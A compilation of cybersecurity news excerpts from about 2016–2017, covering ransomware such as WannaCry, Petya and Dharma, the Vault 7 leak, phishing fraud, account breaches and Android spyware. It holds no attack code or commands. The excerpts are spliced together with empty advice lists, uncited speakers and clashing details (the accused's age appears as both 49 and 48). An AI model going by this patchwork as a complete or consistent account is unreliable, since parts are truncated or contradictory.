Back in April 2016, for instance, BBC News reporter Shari Vahl and ZDNet journalist Zack Whittaker  separately spotted malicious emails in their inboxes that said they owed money to a collection agency, and included their real-life address information to make the messages appear more convincing.
Unlike the German campaign, however, the UK attack sought to trick users into clicking on links that led them to Maktub ransomware.
No matter how convincing an email seems to be, it always pays to double check these kinds of claims by calling the company purportedly making the claim to confirm the message’s authenticity (or to prove that it is false).""
Aside from confirming with the alleged sender, users should maintain an up-to-date security solution on their computers, implement software updates as soon as they become available, and delete any suspicious emails.

This file photo taken on August 13, 2008 shows a man walking over the seal of the Central Intelligence Agency (CIA) in the lobby of CIA Headquarters in Langley, Va.
Wikileaks' latest data dump, the ""Vault 7,"" purporting to reveal the Central Intelligence Agency's hacking tools, appears to be something of a dud.
If you didn't know before that spy agencies could apply these tools and techniques, you're naive, and if you think it undermines the attribution of hacker attacks on the Democratic National Committee and other targets, you'll be disappointed.
On the surface, the dump — touted by Wikileaks as the biggest ever publication of confidential CIA documents — offers some explosive revelations.
They're all over the news pages: The CIA is able to use your Samsung smart TV to eavesdrop on you!
The CIA can get into your iPhone or Android device, as well as your Windows, Mac or Linux PC, and harvest your communications before they are encrypted!
No encryption app — not even the Edward Snowden favorite, Signal, or WhatsApp, which uses the same encryption — is safe!
The CIA hoards ""zero day"" vulnerabilities — weaknesses not known to the software's vendors — instead of revealing them to the likes of Google, Apple and Microsoft!
CIA hackers use obfuscation tools to pretend its malware was made by someone else, including Russian intelligence!
There's even a Buzzfeed story quoting current and former U.S. intelligence officers that the dump is ""worse than Snowden's.""
There is little content in the dump to support these panicky reactions.
Nothing in it indicates that the CIA has broken messenger encryption, as Open Whisper Systems, the software organization responsible for Signal, has been quick to point out.
The CIA can read messenger communications only if it plants malware on a specific phone or computer; then it can harvest keystrokes and take screenshots.
This is not about mass surveillance — something that should bother the vast majority of internet users — but about monitoring specific targets.
Open Whisper Systems tweeted on March 7: ""Ubiquitous e2e encryption is pushing intelligence agencies from undetectable mass surveillance to expensive, high-risk, targeted attacks.""
It's not much of a secret that using a hacked phone or computer renders end-to-end encryption useless.
It was the essence of Apple's dispute with the Federal Bureau of Investigation last year, when the company wouldn't help the FBI get into a phone owned by San Bernardino shooter Syed Rizwan Farook.
The Big Brother-style implications of a hacked Samsung TV are undermined by the nature of the documents that describe the hack.
The CIA needs physical access to the TV set to weaponize it.
Robert Graham, founder of Errata Security, wrote on the firm's blog:
""The docs are clear that they can update the software running on the TV using a USB drive.
There's no evidence of them doing so remotely over the Internet.
If you aren't afraid of the CIA breaking in an installing a listening device, then you should't be afraid of the CIA installing listening software.""
The Wikileaks cache contains a manual for CIA hackers on making their malware harder to trace, for example, by adding foreign languages.
Wikileaks also said that the CIA ""collects and maintains a substantial library of attack techniques 'stolen' from malware produced in other states including the Russian Federation.""
The library, however, contains all sorts of publicly available malware, as well as samples tentatively attributed to foreign intelligence services; all that does is confirm that hackers, including CIA ones, aren't picky about the origins of the products they use.
The important thing is that the malware should work.
This shouldn't affect serious attempts to attribute hacker attacks.
I'm not sure this is fully understood within the U.S. intelligence community itself — at any rate, the declassified report on Russian hacking it released late last year appeared to base attribution on the use of specific publicly available malware.
But industry experts usually need much more evidence.
A number of possible Russian attacks were attributed to Moscow's intelligence services because the attackers used specific command and control centers — servers — to collect information from various Russia adversaries.
To set up a false flag operation, the CIA would need to go much further than obfuscating the origins of its malicious code.
So all the jubilant tweets from Trump supporters declaring the CIA was behind the ""Russian hacks"" are at least premature and probably inaccurate.

If you want to know what some ransomware developers think about the USA, you can get a good idea from the ransom note of the Sanctions Ransomware that was released in March. Dubbed Sanctions Ransomware due to the image in the ransom note, the developer makes it fairly obvious how they feel about the USA and their attempts to sanction Russia.
I was tipped off about this new ransomware after someone was infected and had their files encrypted with the .wallet extension. This extension is typically associated with the Crysis/Dharma ransomware, but according to Michael Gillespie, the creator of ID-Ransomware, the files encrypted by Sanctions do not contain the standard Dharma/Crysis file markers as shown below.
While I have not been able to find a sample of the actual ransomware, I was able to find a copy of the ransom note on ID-Ransomware. This ransom note is called RESTORE_ALL_DATA.html  and contains a link to a satoshibox page where the ransomware developer is selling the decryption key for 6 bitcoins. This equates to about $6,500 USD at bitcoin's current rate. 
As this is a very large ransom payment and due to the fact that this ransomware is not in wide circulation, it leads me to believe that this ransomware developer may be conducting targeted attacks.
Unfortunately, this is all the information we have at this time. At some point we will find a sample and be able to provide more information as we further analyze this ransomware.

Cybercriminals that specialize in ransomware, which affects thousands of computers and mobile devices every year, are ramping up their attacks against businesses.
It is here that they can get their hands on valuable information and large sums of cash.
This particular kind of malware, which hijacks devices and demands a ransom for their return, has managed to conquer another kind of technology: smart TVs.
Last December, the American developer Darren Cauthon announced on Twitter that a family member’s television had fallen victim to one of these attacks.
The television in question was an LG model that came out in 2014 that is compatible with Google TV, a version of Android tailored to televisions.
Once it had infiltrated the device, the malicious software demanded a ransom of $500 dollars to unlock the screen, which simulated a warning from the Department of Justice.

The appearance of the false message would lead you to believe that it’s a version of the ransomware known as Cyber.police, also known as FLocker.
Ordinarily this ransomware affects smartphones with Google’s operating system.
After hijacking the device, the malware collects information from the user and the system, including contact information and the location of the device, to be sent encrypted to cybercriminals.

The email-borne attack locked the city’s servers and many of the daily business functions, officials said.
(TNS) -- SPRING HILL, Tenn. — The city was the victim of a recent cyber-attack, which caused its computer system to lock with a ransom of $250,000.
Spring Hill was one of several other local government agencies who were victim to the attack, and city officials say they do not believe any citizen or customer account information was stolen or compromised.
It did, however, temporarily halt any online credit or debit card payments.
""We received a ransomware attack Friday evening that ended up going in and locking our servers. It affected all of our departments, and we have been in recovery mode ever since [Sunday],"" City Administrator Victor Lay said. ""We've now been able to, at least minimally, conduct business, although the manual system of paper and pencil seems to work pretty well against those kinds of things.""
Lay added that the ""appropriate government authorities"" have been contacted about the incident, which will meet later this week to discuss an investigation into the incident.
He said it was not a ""hack"" per se, but a virus created from a downloadable email attachment, locking the system using an encryption key.
""We're working through it. Obviously, we chose not to pay the ransom. We're working through the system and it's going to take us a few days to get things all back to normal, but we're getting there.""

Cyberattacks on banks and others have seemingly disappeared, making them all the more dangerous.
Malicious software, the type criminals use to steal online banking login credentials from customer or employee desktops, has been getting more stealthy and effective over time, as its authors get progressively better at evading antivirus and antimalware programs.
But there’s an emerging generation of malware that’s even sneakier.
It’s not only designed to escape detection, it can lurk in computer memory or a legitimate computer tool, where normal security software can’t see it.
Malicious code that runs in memory is called “fileless”.

On April 14, the company disclosed to the California attorney general that a December 2015 breach compromised more sensitive information than first thought. It also disclosed new attacks from earlier this year that exposed names, contact information, email addresses and purchase histories, although  the retailer says it repelled most of the attacks.
The dual notifications mark the latest problems for the company, which disclosed in early 2014 that its payment systems were infected with malware that stole 350,000 payment card details. Over the past few years, retailers such as Target, Home Depot and others have battled to keep their card payments systems malware-free (see Neiman Marcus Downsizes Breach Estimate). 
The 2015 incident started around Dec 26. In a notification to California about a month later, the retailer said it was believed attackers cycled through login credentials that were likely obtained through other data breaches. A total of 5,200 accounts were accessed, and 70 of those accounts were used to make fraudulent purchases. 
Although email addresses and passwords were not exposed, the original notification noted, access to the accounts would have revealed names, saved contact information, purchase histories and the last four digits of payment card numbers. The affected websites included other brands run by Neiman Marcus, including Bergdorf Goodman, Last Call, CUSP and Horchow. 
According to its latest notification, however, Neiman Marcus Group now says full payment card numbers and expiration dates were exposed in the 2015 incident.
The latest attack disclosed by Neiman Marcus Group, which occurred around Jan 17, mirrors the one from December 2015. It affects the websites of Neiman Marcus, Bergdorf Goodman, Last Call, CUSP, Horchow and a loyalty program called InCircle. 
Again, the company believes that attackers recycled other stolen credentials in an attempt to see which ones still worked on its sites. It appears that some of the credentials did unlock accounts. The breach exposed names, contact information, email addresses, purchase histories and the last four digits of payment card numbers. It didn't specify the number of accounts affected. 
The attackers were also able to access some InCircle gift card numbers, the company says.
Web services can slow down hackers when suspicious activity is noticed, such as rapid login attempts from a small range of IP addresses. Those defensive systems can be fooled, however, by slowing down login attempts and trying to plausibly geographically vary where those attempts originate. 
For those affected by the January incident, Neimen Marcus Group is enforcing a mandatory password reset. It's an action that's not undertaken lightly for fear of alienating users, but it's a sign of how serious a service feels the risk is to users or customers. The company also is offering those affected a one-year subscription to an identity theft service.

Between an industry-wide push to encrypt all web traffic and the newfound popularity of secure chat apps, it's been a boom time for online privacy.
Virtual private networks, which shield your web traffic from prying eyes, have rightly garnered more attention as well.
But before you use a VPN to hide your online shopping from the IT department at your company—or help protect yourself from state surveillance—know that not all mobile VPNs are created equal.
You can use VPNs to conceal the location revealed by your IP address; one common use before a recent crackdown was to access regional content, like US Netflix, from countries with lesser libraries.
Ideally, a VPN funnels all your traffic through an encrypted, secure, private network, making it more difficult for a third party to monitor your browsing than if your data were exposed on a public network.
It all sounds great, but isn't always so rosy in practice.
That's because using a VPN grants the company behind it extensive access to your data at the same time that it hides the stream from everyone else.
Even worse, malware masquerading as a VPN could do real damage by concealing malicious activity on your device behind a veneer of security protection.
""These days, many people know what a VPN is and what they can do with one,"" says Kevin Du, a computer security researcher at Syracuse University and an IEEE senior member.
""Not many people know what a bad or flawed VPN can do to their devices, because they don’t know how VPN works.""
VPNs have been around for years, as have their attending trust issues.
But while previously VPN enthusiasts were mostly a core base of desktop users, the mobile boom and app-store accessibility have created an explosion in mobile VPN offerings.

iOS 10.3, released to the public this morning, fixes a bug that allowed scammers to attempt to extort money from iOS users through a JavaScript pop-up in Safari.
As explained by mobile security firm Lookout (via Ars Technica), the scammers targeted iOS users viewing pornographic material and abused JavaScript pop-ups to create an endless pop-up loop that essentially locked the browser if the user didn't know how to bypass it. 
Using ""scareware"" messages and posing as law enforcement, the scammers used the pop-ups to extort money in the form of iTunes gift cards from the victim, promising to unlock the browser for a sum of money.
    The scammers abused the handling of pop-ups in Mobile Safari in such a way that a person would be ""locked"" out from using Safari unless they paid a fee or knew they could simply clear Safari's cache (see next section). The attack was contained within the app sandbox of the Safari browser; no exploit code was used in this campaign, unlike an advanced attack like Pegasus that breaks out of the app sandbox to install malware on the device.
    The scammers registered domains and launched the attack from the domains they owned, such as police-pay[.]com, which the attackers apparently named with the intent of scaring users looking for certain types of material on the Internet into paying money.
The endless pop-up issue could be fixed by clearing the Safari cache, but many users likely did not know they didn't need to shell out money to regain access to their browsers.
Pop-up scams are no longer possible with iOS 10.3, as Apple has changed the way pop-up dialogs work. Pop-ups are now per-tab and no longer take over the entire Safari app.

A pediatrics practice, ABCD Pediatrics, serving the San Antonio, Texas metropolitan area reported that it was hit with a ransomware attack, but existing antivirus software helped to slow down the attack, and the practice's IT vendor successfully removed the virus and all corrupt data from its servers. However, because hackers may have accessed portions of the practice’s network, the pediatrics group is offering identity and credit protection services from Equifax Personal Solutions to all of its patients.
The pediatrics group, which has four locations, posted a “HIPAA Notification” on its website, regarding an incident that may have affected patients’ protected health information (PHI). The practice stated that the notice was made in compliance with the Health Insurance Portability and Accountability Act of 1996 (HIPAA).
Prior to the attack, ABCD Pediatrics had a variety of security measures in place, including network filtering and security monitoring, intrusion detection systems, firewalls, antivirus software, and password protection, according to the organization’s statement.
On February 6, 2017, an employee of ABCD Pediatrics discovered that a virus gained access and began encrypting ABCD’s servers. The encryption was slowed significantly by existing antivirus software. Upon discovery, ABCD immediately contacted its IT vendor, and ABCD’s servers and computers were promptly moved offline and analyzed. The virus was identified as “Dharma Ransomware,” which is a variant of an older ransomware virus called “CriSiS,” according to the organization’s IT vendor.
“ABCD’s IT company reported that these virus strains typically do not exfiltrate (“remove”) data from the server; however, exfiltration could not be ruled out. Also, during the analysis of ABCD’s servers and computers, suspicious user accounts were discovered suggesting that hackers may have accessed portions of ABCD’s network,” the organization stated.
The IT vendor successfully removed the virus and all corrupt data from its servers, and the practice said that secure backup data stored separately from its servers and computers was not compromised by the incident, and it was used to restore all affected data. According to the organization, no confidential information was lost or destroyed, including PHI, and the practice group never received a ransom demand or other communications from unknown persons. In addition to notifying its patients, ABCD notified the FBI and the U.S. Department of Health and Human Services.
According to the HHS’ Office of Civil Rights’ data breach portal, the incident affected 55,447 patients.
While the IT vendor found no evidence that confidential information was actually acquired or removed from its servers and computers, it could not rule out the possibility that confidential information may have been viewed and possibly was acquired, according the ABCD Pediatrics’ statement. Affected information may have included patients’ names, addresses, telephone numbers, dates of birth, Social Security Numbers, insurance billing information, medical records, and laboratory reports.
Following this incident, ABCD’s IT vendor located the source of the intrusion and implemented additional security measures, including state of the art cyber monitoring on its network, the organization said.
In addition to the identity and credit protection services from Equifax, the pediatrics group recommended that patients also place a fraud alert on their credit files.

Last week HackRead exclusively reported on a vendor selling over 1 million Gmail and Yahoo accounts on a Dark Web marketplace.
Now, the same vendor is back with yet another listing and this time the victims are PlayStation users.
The vendor who goes by the handle of “SunTzu583” is selling 640,000 accounts of PlayStation users in just USD 35.71 (0.0292 BTC) stolen from an unknown database.
These accounts contain emails along with their clear-text passwords.
According to SunTzu583, the database was not directly stolen from PlayStation servers, but it does contain unique accounts of PlayStation users.
SunTzu583 goes on to explain that these accounts may also work on other sites however they can be mainly used for PlayStation-related activities.
It must be noted that in 2015, 2.5 million Xbox (Xbox 360 ISO) and Playstation accounts (PSP ISO) were stolen and leaked on the Dark Web marketplaces in February 2017.
Also, about five months ago several PlayStation users were complaining that their accounts have been hacked and in some cases, their funds were missing.
While the vendor has already announced that the database is not directly stolen from PlayStation servers, it is quite possible that it was taken from a third party server.
We at HackRead can not confirm the authenticity of this database, but if you have an account on PSN, it is advisable to change its password and also use a different password on other sites.

Evaldas Rimasauskas, 49 who allegedly conned two of the world's biggest companies was arrested on fraud charges
GOOGLE and Facebook have admitted they were conned out of an alleged $100million (£77million) in a phishing scam.
The two world's biggest companies fell victim after a Lithuanian man allegedly tricked employees into wiring over the money to bank accounts that he controlled, Fortune reported on Thursday.
Evaldas Rimasauskas, 48, is accused of posing as an Asia-based manufacturer and deceived the internet giants from around 2013 until 2015.
He was arrested earlier this month in Lithuania at the request of US authorities
The conman is said to have forged email addresses, invoices and corporate stamps to impersonate Quanta and trick them into paying for computer supplies.
Rimasauskas, who is awaiting extradition proceedings, has denied the allegations.
The US Department of Justice (DOJ) said last month: ""Fraudulent phishing emails were sent to employees and agents of the victim companies, which regularly conducted multi-million-dollar transactions with [the Asian] company.""
Both Facebook and Google have confirmed the fraud and said that they had been able to recoup funds.
But they didn't reveal how much money it had transferred and recouped.
A Google spokeswoman said: ""We detected this fraud against our vendor management team and promptly alerted the authorities.""
""We recouped the funds and we’re pleased this matter is resolved.""
A spokeswoman for Facebook added: ""Facebook recovered the bulk of the funds shortly after the incident and has been cooperating with law enforcement in its investigation.""
Security experts said the recent cyber attack highlighted how sophisticated phishing scams are being used to fool even two of the biggest tech companies.

The Fancy Bear hackers, believed to be sponsored by Russia's main intelligence arm, the GRU, are back at it and have successfully breached the International Association of Athletics Federations. The IAAF is the world governing body for track and field.
Just as with the 2016 attacks on the World Anti-Doping Agency (WADA), also allegedly perpetrated by Kremlin-backed hackers, data on Therapeutic Use Exemption (TUE) applications were targeted. TUEs allow athletes to take normally-prohibited substances where they're required, such as when they suffer from an illness.
Sebastian Coe, an Olympic champion and current IAAF president, said the organization apologized to athletes affected by the hack, which dated back to at least February 21. It was only this weekend, however, that the IAAF and partner organizations carried out a ""complex remediation across all systems and servers in order to remove the attackers' access to the network,"" according to the official statement.
On first inspection, it appeared data on TUEs was collected from a file server and stored in a newly created file, though it wasn't clear if the information had been taken outside the network. ""Our first priority is to the athletes who have provided the IAAF with information that they believed would be secure and confidential,"" said Coe.
The IAAF's contractor, Context Information Security, discovered the breach. The find came after the security firm was asked by the IAAF in January to ""conduct a proactive and thorough technical investigation across its systems, which led to the discovery of a sophisticated intrusion,"" a Context spokesperson told Forbes via email. The company was confident Fancy Bear, also known as APT28, was responsible.
""The threat intelligence team at Context Information Security has tracked the tools, techniques and procedures of Fancy Bear/APT28 for a number of years, through our own investigations and through collaboration with many other cyber security researchers [and] organizations. Our findings in this investigation give us a high degree of confidence that this cyber attack can be attributed to Fancy Bear/APT28.""
In response to a question about the time it took from discovery in February to throwing the hackers off the network at the start of April, the spokesperson said the parties needed to collect forensic images to ""better understand how the attacks were carried out, what information may have been compromised."" ""By taking the time to fully investigate the attack, the IAAF was able to remove the attackers' access to the network as effectively as possible,"" the spokesperson added.
If IAAF had gone public with this before the investigation was complete and before the attackers' access was removed, the attackers may have been tipped off to the investigation and performed further malicious actions.
The Facebook page for the WADA hackers, who posted under the pluralized name Fancy Bears, has not been updated since December 2016.
Though the TUEs show athletes legally use normally-banned substances, the Fancy Bear hacks still caused trouble for some athletes. Those affected by last year's attacks on WADA and the USADA hit huge names across a range of sports, including tennis giants Serena and Venus Williams, and Rafael Nadal, as well as cycling superstar Bradley Wiggins, who continues to contest rumors about Team Sky's operations.
The Fancy Bear group was accused by multiple security companies, the DHS and the FBI of being sponsored by the Russian government and of carrying out the significant breach of the Democratic National Committee (DNC).

The development weighing on investors' sentiment is the fallout from a massive global cyber attack. The global cyber attack that crippled more than hundreds of thousands of computers over 150 countries is poised to swell today. The ransomware employed by hackers, who have demanded Bitcoin payments from the victims, renders files stored on afflicted computers inaccessible completely.
A number of large corporations and many hospitals in Britain have been infected with this malware. There have been reports of infections in 150 countries, including the UK, US, China, Russia, Spain, Italy and Taiwan. The US President Donald Trump directed his homeland security adviser to hold meetings on the matter over the weekend.

An Android SMS-based spyware dubbed SMSVova, which can steal and relay a victim's location to an attacker in real time, has been downloaded between one and five million times since 2014 from the US Google Play store.
Zscaler ThreatLabz found that the app claimed to give users access to the latest Android software updates, but in fact was being used to spy on a user’s exact geolocation, which could have been used for any number of malicious reasons.
Despite clear red flags, millions downloaded it.
“The app portrays itself as a ‘System Update,’” the firm’s researchers explained, in a blog. “After reading the app reviews, it became clear that several users were misled by the app, thinking that it would provide them with latest Android release. Many users were unhappy with the app and conveyed their concerns.”
In addition to the negative reviews, there were other indicators that raised suspicions: The Google Play Store page for this particular app was showing blank screenshots, which is not common, and there was no proper description for the app. It also didn’t mention that it would track the victim, nor that it would send location information to a third party. It said only, “This application updates and enables special location features.”
“There are many spyware variations present on the Google Play store, such as Cell Tracker, but the legitimate apps are explicit in their intentions, and have specific purposes for tracking a user’s device,” Zscaler researchers noted.
As soon as the user tries to start up the app, it abruptly quits and hides itself from the main screen. From there, it sets up an Android service and broadcast receiver to fetch the user’s last known location and set it up in Shared Preferences. An attacker could also set a location alert when victim’s battery is running low.
Interestingly, the code is a carbon copy of the location-stealing code in DroidJack, the remote access trojan.
“There are many apps on the Google Play Store that act as a spyware; for example, those that spy on the SMS messages of one’s spouse or fetch the location of children for concerned parents,” researchers said. “But those apps explicitly state their purpose, which is not the case with the app we analyzed for this report. It portrayed itself as a system update, misleading users into thinking they were downloading an Android System Update.”
Google has removed the app from the store since Zscaler reported it to the Google security team.

Universities often need to have a number of computers in classrooms ready for faculty and staff to use for presentations and Internet access, which can be a security challenge. Carleton University is the latest to find that out when a regular inspection discovered USB keylogging devices had been plugged into six classroom PCs.
The computers themselves can’t store data, said Beth Gorham, Carleton’s manager of public affairs, so there was no risk of university data being captured. However, the PCs are connected to the campus network so keyloggers would be able to capture login information. As a result all staff, faculty, contract instructors and teaching assistants have been ordered to change their passwords. In addition, the university has recommended all students do the same “out of an abundance of caution.”
“We have no indication that any personal information has been obtained,” she said.
Discovery of the devices was made a week ago during a regular inspection of classroom devices by the instructional media services staff, Gorham said. Until now because presenters use USB memory sticks for presentations the USB ports of the computers hadn’t been locked, Gorham said.
However, she said, since the discovery “those computers and other were secured [with locks] so this can’t happen again.” And as a result of the incident classroom inspections have been stepped up.

There’s no question that Friday’s WannaCry ransomware attack, which spread like wildfire, was bad. Its ability to spread like a worm by exploiting a Microsoft vulnerability was certainly new ground for a ransomware campaign. But along the way, there’s been a lot of fear and hype. Perspective is in order.
Here’s a look at the latest in Sophos’ investigation, including a recap of how it is protecting customers. From there, we look at how this fits into overall attack trends and how, in the grand scheme of things, this doesn’t represent a falling sky.
With the code behind Friday’s attack in the wild, we should expect copycats to cook up their own campaigns in the coming days to capitalize on the money-making opportunity in front of them.
Over the weekend, accounts set up to collect ransom payments had received smaller amounts than expected for an attack of this size. But by Monday morning, the balances were on the rise, suggesting that more people were responding to the ransom message Monday. On Saturday, three ransomware-associated wallets had received 92 bitcoin payments totaling $26,407.85 USD. By Sunday, the number between the three wallets was up to $30,706.61 USD. By Monday morning, 181 payments had been made totaling 29.46564365 BTC ($50,504.23 USD).
Analysis seems to confirm that Friday’s attack was launched using suspected NSA code leaked by a group of hackers known as the Shadow Brokers. It used a variant of the Shadow Brokers’ APT EternalBlue Exploit (CC-1353), and used strong encryption on files such as documents, images, and videos.
A perfect attack would self-propagate but would do so slowly, randomly and unpredictably. This one was full throttle, but hardly to its detriment. Here we had something that spread like wildfire, but the machines that were impacted were probably still susceptible to secondary attacks because the underlying vulnerability probably hasn’t been patched.
The problem is that exploit and payload are separate. The payload went fast and got stopped, but that’s just one of an infinite number of possibilities that can spread through the unsolved exploit.
Companies still using Windows XP are particularly susceptible to this sort of attack. First launched in 2001, the operating system is now 16 years old and has been superseded by Windows Vista and Windows 7, 8 and 10 upgrades.
It remains to be seen who was behind this attack. Sophos is cooperating with law enforcement to provide any intelligence it can gather about the origins and attack vectors. The company believes initial infections may have arrived via an email with a malicious payload that a user was tricked into opening.
Sophos continues to update protections against the threat. Sophos Customers using Intercept X and Sophos EXP products will also see this ransomware blocked by CryptoGuard. Please note that while Intercept X and EXP will block the underlying behavior and restore deleted or encrypted files in all cases we have seen, the offending ransomware splash screen and note may still appear.
For updates on the specific strains being blocked, Sophos is continually updating a Knowledge-Base Article on the subject.
Meanwhile, everyone is urged to update their Windows environments as described in Microsoft Security Bulletin MS17-010 – Critical. For those using older versions of Windows, Microsoft has provided Customer Guidance for WannaCrypt attacks and has made the decision to make the Security Update for platforms in custom support only – Windows XP, Windows 8, and Windows Server 2003 – broadly available for download.
As severe as this attack was, it’s important to note that we’re not looking at a shift in the overall attack trend. This attack represents a merging of old behaviors into a perfect storm. SophosLabs VP Simon Reed said:
This attack demonstrates the opportunistic nature of commercial malware authors to re-use the most powerful of exploit techniques to further their aims, which is ultimately to make money.
In the final analysis, the same advice as always applies for those who want to avoid such attacks.
To guard against malware exploiting Microsoft vulnerabilities:
To guard against ransomware in general:
Finally, there’s the question of whether victims should pay the ransom or stand their ground. Sophos has mostly taken a neutral stance on the issue.
In the case of this attack, paying the ransom doesn’t seem to be helping the victims so far. Therefore, Levy believes paying the WannaCry ransom is ill-advised:
In general, paying is a bad idea unless the organization is truly desperate to get irreplaceable data back and when it is known that the ransom payment works. In this attack, it doesn’t appear to work.

It’s been referred to as a ‘kill switch’ – that all the malware author had to do to throw the breaks on for some reason was to register some obscure domains. In the event a security researcher found the domains and registered them. He speculates that its not actually a kill switch but may be a form of sandbox detection (malware wants to run in the real world and hide when it’s in a researcher’s sandbox.) 
The thinking goes that in the kind of sandbox environment used by security researchers the domains might appear to be registered when in fact they are not. If the malware can get a response from the unregistered domains it thinks it’s in a sandbox and shuts down.
If you blocklist the domains in your network then you’re turning off the “kill switch”. If you allowlist the domains you’re allowing access to the kill switch.

 Julian Assange claimed Thursday during a press conference about the WikiLeaks release of alleged CIA hacking documents that the CIA is trying to cover up the loss of its hacking tools, and that the tools may now ""also be in the black market or used by American hackers who cross both sides of the fence.""

However, he said some of the ""components for the tools"" had already been available on the black market.
Komarov said his firm had looked at all the documents released by WIkiLeaks and said they didn't contain any of the tools, just ""their descriptions and tutorials how to use them.

A few days ago experts at antivirus firm ESET spotted a new MacOS ransomware, a rarity in the threat landscape, but it has a serious problem.
Malware experts from antivirus vendor ESET have discovered a new file-encrypting ransomware, dubbed OSX/Filecoder.E, targeting MacOS that is being distributed through bittorrent websites.“Early last week, we have seen a new ransomware campaign for Mac. This new ransomware, written in Swift, is distributed via BitTorrent distribution sites and calls itself “Patcher”, ostensibly an application for pirating popular software.” reads the analysis published by ESET.
The bad news for the victims is that they will not be able to recover their files, even if they pay the ransom.
MacOS ransomware is not common in the threat landscape, this is the second such malware discovered by the security experts after the researchers spotted the Keranger threat in March 2016.
The OSX/Filecoder.E MacOS ransomware masquerades itself as a cracking tool for commercial software like Adobe Premiere Pro CC and Microsoft Office for Mac. The fake cracking tool is being distributed as a bittorrent download.
The malware researchers noted that the ransomware is written in Apple’s Swift programming language and it appears to be the result of the work of a novice Vxer.
The MacOS ransomware is hard to install on the last OS X and MacOS versions because the installer is not signed with a developer certificate issued by Apple.
The OSX/Filecoder.E MacOS ransomware generates a single encryption key for all files and then stores the files in encrypted zip archives. Unfortunately, the malicious code is not able to send the encryption key to the C&C server before being destroyed, this makes impossible the file decryption.
The experts highlighted that implementation of the encryption process is effective and makes impossible to crack it.
“There is one big problem with this ransomware: it doesn’t have any code to communicate with any C&C server. This means that there is no way the key that was used to encrypt the files can be sent to the malware operators.” continues the analysis.
“The random ZIP password is generated with arc4random_uniform which is considered a secure random number generator,” “The key is also too long to brute force in a reasonable amount of time.”
At the time I was writing, the monitoring to the bitcoin wallet address used to receive the payment of the victims revealed that none has paid the ransom.
Experts believe that the crooks behind OSX/Filecoder. E are likely interested in scamming the victims instead of managing a botnet.
“This new crypto-ransomware, designed specifically for macOS, is surely not a masterpiece. Unfortunately, it’s still effective enough to prevent the victims accessing their own files and could cause serious damage.” closed the analysis.

 MOSCOW — A new wave of powerful cyberattacks hit Europe and beyond on Tuesday in a possible reprise of a widespread ransomware assault in May. Affected were a Russian oil giant, a Danish shipping and energy conglomerate, and Ukrainian government ministries, which were brought to a standstill in a wave of ransom demands. The virus even downed systems at the site of the former Chernobyl nuclear power plant, forcing scientists to monitor radiation levels manually.
Cyberattacks also spread as far as India and the United States, where the pharmaceutical giant Merck reported on Twitter that “our company’s computer network was compromised today as part of global hack.” The New Jersey-based company said it was investigating the attack.
Cyber researchers say that the virus, which was linked to malware called Petrwrap or Petya, used an “exploit” developed by the National Security Agency that was later leaked onto the Internet by hackers. It is the second massive attack in the past two months to turn powerful U.S. exploits against the IT infrastructure that supports national governments and corporations.
The onslaught of ransomware attacks may be the “new normal,” said Mark Graff, the chief executive of Tellagraff, a cybersecurity company.
“The emergence of Petya and WannaCry really points out the need for a response plan and a policy on what companies are going to do about ransomware,” he said.
The attack mainly targeted Eastern Europe but also hit companies in Spain, Denmark, Norway and Britain. Victims included the British advertising and marketing multinational WPP and a shipping company, APM Terminals, based at the port of Rotterdam.
But the damage was worst in Ukraine.
Researchers at Kaspersky Lab’s Global Research and Analysis Team, in Russia, estimated that 60 percent of infected computers were in Ukraine and 30 percent in Russia. 
The hacks targeted government ministries, banks, utilities and other important infrastructure and companies nationwide, demanding ransoms from government employees in the cryptocurrency bitcoin. 
The hacks’ scale and the use of ransomware recalled the massive cyberattack in May in which hackers possibly linked to North Korea disabled computers in more than 150 nations using a flaw that was once incorporated into the National Security Agency’s surveillance tool kit.
Cyber researchers have tied the vulnerability exploited by Petya to the one used by WannaCry — a weakness discovered by the NSA years ago that the agency turned into a hacking tool dubbed EternalBlue. Petya, like WannaCry, is a worm that spreads quickly to vulnerable systems, said Bill Wright, senior policy counsel for Symantec, the world’s largest cyber­security firm. But that makes it difficult to control — or to aim at anyone in particular, he said.
“Once you unleash something that propagates in this manner, it’s impossible to control,” he said.
Although Microsoft in March made available a patch for the Windows flaw that EternalBlue exploited, Petya uses other techniques to infect systems, said Jeff Greene, Symantec government affairs director.

The average ransomware attack yielded $1,077 last year, new research shows, representing a 266 percent spike from a year earlier.
The reason for the landmark year for hackers? Many ransomware victims readily pay the price.
The number of attacks, varieties of distinct malware and money lost ballooned as ransomware became one of the top tactics of attackers, according to new research from the security firm Symantec.
Some of the most high-profile ransomware incidents of the last year include San Francisco’s Muni getting hit, Washington D.C.’s police department being breached just before inauguration and a Los Angeles college paying a $28,000 ransom.
Hoping to turn the tide against the billion-dollar ransomware industry, last year the FBI urged businesses to alert authorities and not pay up. Instead, most keep attacks a secret, paying off hackers 70 percent of the time. That behavior only increases the sweet spot for demands, as criminals seek the highest possible ransom while trying to avoid the attention of law enforcement.
Economists say hackers who apply more sophisticated pricing techniques “could lead to dramatic increases in profits at relatively little costs.”
The highest demand seen in public during the last was $28,730 from MIRCOP ransomware. It’s not clear if anyone actually paid off those specific hackers.
In private, however, higher ransoms are finding success when hackers successfully target the right companies. An IBM Security study from December 2016 found that over half of the businesses they surveyed said they had already paid over $10,000 in ransom while 20 percent said they’d paid over $40,000.
Globally, 34 percent of victims end up paying ransom. American victims, however, pay at a rate of 64 percent, according to Norton.
“That’s a phenomenal number,” Symantec’s Kevin Haley told CyberScoop. “I always compare it to direct mail where if you get a 1 percent rate you’re doing really good. These guys get a 34 percent return rate. Extortion really pays.”
The twist of the knife comes when only 47 percent of victims who pay the ransom actually recover any files.
“If so many people are willing to pay the ransom, there’s no reason for the price to come down,” Haley said. “In fact, it’s only going to go up. We may see that average go even higher until that price ceiling is discovered when so many people aren’t willing to pay that much. But we haven’t hit it yet.”

"
However, modern ransomware certainly merits a classification as one of the most evolving sectors of cybercrime in 2017.
Though it is quite difficult to calculate the overall damage caused by ransomware in 2016, some researchers state that cybercriminals received over $1 billion in ransom payments last year.
Others mention a 3,500% increase in the criminal use of infrastructure that helps run ransomware campaigns.
Carbon Black says that ransomware is the fastest growing malware across industries, up 50% in 2016.
Technology (218%), utilities and energy (112%) and banking (93%) saw the highest year-on-year ransomware growth last year.
Due to an important lack of qualified technical personnel and other resources, law enforcement agencies are globally unprepared to detect, prevent and prosecute this type of digital crime.
Moreover, more and more cases of ransom payment by the police have become public, while those police officers who dare to resist take a substantive risk.
There is the Texas police who lost eight years of their investigative work and all of the evidence by refusing to pay cybercriminals.
